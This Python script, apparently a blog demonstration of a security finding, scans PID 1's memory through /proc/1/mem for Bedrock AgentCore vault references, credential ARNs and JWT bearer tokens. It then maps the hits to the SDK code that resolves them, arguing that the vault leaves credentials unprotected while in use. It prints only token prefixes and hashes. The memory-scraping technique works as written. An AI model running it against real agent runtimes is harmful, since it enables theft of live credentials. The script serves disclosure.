"""Blog demo — complete vault resolution trace: heap evidence + source code.

Combines the canary search (pid1_vault_canary.py) with the mechanism trace
(pid1_vault_mechanism.py) into one comprehensive output:

  Part 1: Search /proc/1/mem for the three resolution stages
  Part 2: Read the source code that performs the resolution
  Part 3: Map the evidence to the code — which function put each stage in heap

No env vars needed.
Hosted at github.com/nivmorabin/skills/dict-walk/pid1_vault_trace.py
"""
import glob
import hashlib
import os
import re
import sys


PKG = '/opt/amazon/lib/python3.10/site-packages'

# Regexes (proven in pid1_identity_recon_exfil.py)
CRED_PROVIDER_ARN_RE = re.compile(
    rb'arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
    rb'(?:credential-provider|token-vault/default/apikeycredentialprovider|token-vault/default/oauth2credentialprovider)'
    rb'/[A-Za-z0-9_\-]+'
)
VAULT_REF_RE = re.compile(
    rb'\$\{arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
    rb'(?:credential-provider|token-vault)[^}]{5,120}\}'
)
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')


def section(title):
    print(f'\n{"=" * 60}')
    print(f'  {title}')
    print(f'{"=" * 60}')


def read_file(path):
    try:
        return open(path).read()
    except Exception as e:
        return f'(error: {e})'


def show_function(source, func_name):
    """Extract and print a function definition."""
    lines = source.split('\n')
    start = None
    for i, line in enumerate(lines):
        if f'def {func_name}' in line:
            start = i
            break
    if start is None:
        return False
    func_line = lines[start]
    func_indent = len(func_line) - len(func_line.lstrip())
    end = len(lines)
    for i in range(start + 1, len(lines)):
        line = lines[i]
        if (line.strip() and len(line) - len(line.lstrip()) <= func_indent
                and not line.strip().startswith(('#', '@', ')'))
                and i > start + 1):
            end = i
            break
    for line in lines[start:min(end, start + 30)]:
        print(f'    {line}')
    if end - start > 30:
        print(f'    ... ({end - start - 30} more lines)')
    return True


def main():
    section('VAULT CREDENTIAL RESOLUTION -- COMPLETE TRACE')
    print()
    print('  Combining memory evidence with source code analysis.')
    print('  Goal: prove end-to-end how ${arn:...} becomes a JWT in heap.')

    # ===================================================================
    # PART 1: Memory evidence
    # ===================================================================
    section('PART 1: MEMORY EVIDENCE (what is in PID 1 heap right now?)')

    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2 or 'r' not in parts[1]:
            continue
        try:
            s, e = parts[0].split('-')
            lo, hi = int(s, 16), int(e, 16)
            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except:
            continue

    vault_refs = []
    cred_arns = []
    jwts = []

    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue
            for m in VAULT_REF_RE.finditer(chunk):
                vault_refs.append((lo + m.start(), m.group(0)))
            for m in CRED_PROVIDER_ARN_RE.finditer(chunk):
                cred_arns.append((lo + m.start(), m.group(0)))
            for m in JWT_RE.finditer(chunk):
                tok = m.group(0)
                if len(tok) >= 600:
                    jwts.append((lo + m.start(), tok, hashlib.sha256(tok).hexdigest()))

    # Dedupe
    unique_refs = sorted(set(r.decode('utf-8', errors='replace') for _, r in vault_refs))
    unique_arns = sorted(set(a.decode('utf-8', errors='replace') for _, a in cred_arns))
    seen_sha = set()
    unique_jwts = []
    for addr, tok, sha in jwts:
        if sha not in seen_sha:
            seen_sha.add(sha)
            unique_jwts.append((addr, tok, sha))

    print()
    print('  Stage 1: ${arn:...} wrappers (pre-resolution config)')
    print(f'    Found: {len(vault_refs)} hit(s)')
    for ref in unique_refs:
        print(f'    -> {ref}')
    if vault_refs:
        print(f'    Address: {hex(vault_refs[0][0])}')

    print()
    print('  Stage 2: Bare credential-provider ARNs (after regex extraction)')
    print(f'    Found: {len(cred_arns)} hit(s)')
    for arn in unique_arns:
        print(f'    -> {arn}')
    if cred_arns:
        print(f'    Address: {hex(cred_arns[0][0])}')

    print()
    print('  Stage 3: Resolved JWT tokens (the credential bytes)')
    print(f'    Found: {len(jwts)} occurrence(s), {len(unique_jwts)} unique')
    for addr, tok, sha in unique_jwts[:3]:
        print(f'    -> addr={hex(addr)}  len={len(tok)}  sha256={sha[:32]}...')
        print(f'       head: {tok[:60].decode("ascii")}...')

    # ===================================================================
    # PART 2: Source code -- the resolution path
    # ===================================================================
    section('PART 2: SOURCE CODE (what code put them there?)')

    # Step A: resolve_header_references
    print()
    print('  --- A. resolve_header_references() ---')
    print('  File: loopy/tools/__init__.py')
    print()
    tools_source = ''
    for fname in ('__init__.py', 'tool_provider.py'):
        content = read_file(f'{PKG}/loopy/tools/{fname}')
        if 'error' not in content[:10]:
            tools_source += content
    show_function(tools_source, 'resolve_header_references')

    # Step B: The call site
    print()
    print('  --- B. Call site: who calls resolve_header_references()? ---')
    callers = []
    for py_file in sorted(glob.glob(f'{PKG}/loopy/**/*.py', recursive=True)):
        try:
            content = open(py_file).read()
        except:
            continue
        rel = py_file[len(PKG)+1:]
        for i, line in enumerate(content.split('\n'), 1):
            if 'resolve_header_references' in line and 'def resolve_header_references' not in line:
                callers.append((rel, i, line.strip()))
    for rel, lineno, line in callers:
        print(f'    {rel}:{lineno}:  {line}')

    # Show context
    if callers:
        caller_file = callers[0][0]
        caller_line = callers[0][1]
        src = read_file(f'{PKG}/{caller_file}')
        if 'error' not in src[:10]:
            lines = src.split('\n')
            start = max(0, caller_line - 6)
            end = min(len(lines), caller_line + 8)
            print()
            for j in range(start, end):
                marker = '>>>' if j + 1 == caller_line else '   '
                print(f'    {marker} {j+1:4d}: {lines[j]}')

    # Step C: Identity SDK
    print()
    print('  --- C. Identity SDK: get_api_key() ---')
    print('  File: bedrock_agentcore/services/identity.py')
    print()
    identity_svc = read_file(f'{PKG}/bedrock_agentcore/services/identity.py')
    if 'error' not in identity_svc[:10]:
        show_function(identity_svc, 'get_api_key')

    # ===================================================================
    # PART 3: Connecting evidence to code
    # ===================================================================
    section('PART 3: EVIDENCE <-> CODE MAPPING')
    print()

    if unique_refs:
        ref_short = unique_refs[0] if len(unique_refs[0]) <= 90 else unique_refs[0][:87] + '...'
        print(f'  HEAP: {ref_short}')
        print(f'  CODE: Harness config -> passed to resolve_header_references(headers)')
        print(f'        _ARN_REF_RE matches ${{arn:...}}, extracts the ARN inside')
    print()
    if unique_arns:
        print(f'  HEAP: {unique_arns[0]}')
        print(f'  CODE: resolve_credential_arn(arn, identity_client)')
        print(f'        Extracts provider name, calls get_api_key()')
    print()
    if unique_jwts:
        jwt_head = unique_jwts[0][1][:50].decode('ascii')
        print(f'  HEAP: {jwt_head}... (len={len(unique_jwts[0][1])})')
        print(f'  CODE: dp_client.get_resource_api_key(**req)["apiKey"]')
        print(f'        Returns plain string -> replaces ${{arn:...}} in header')

    print()
    print('  ' + '-' * 56)
    print()
    print('  The resolution chain, live in one memory dump:')
    print()
    print('    create_harness(headers={"Authorization": "Bearer ${arn:...}"})')
    print('         |')
    print('         v')
    print('    resolve_header_references()  -->  regex extracts ARN')
    print('         |')
    print('         v')
    print('    get_api_key(provider, token)  -->  boto3 API call')
    print('         |')
    print('         v')
    print('    returns JWT string  -->  replaces ${arn:...} in header')
    print('         |')
    print('         v')
    print('    httpx sends: Authorization: Bearer eyJraWQiOi...')
    print('         |')
    print('         v')
    print('    ALL THREE live in PID 1 heap, readable via /proc/1/mem')
    print()
    print('  The credential is NEVER:')
    print('    X Encrypted in memory')
    print('    X Isolated in a separate address space')
    print('    X Zeroed after use')
    print('    X Protected from same-UID /proc/pid/mem reads')
    print()
    print('  The vault protects at-rest and in-transit.')
    print('  It provides ZERO in-use protection.')

    section('DONE')


if __name__ == '__main__':
    main()
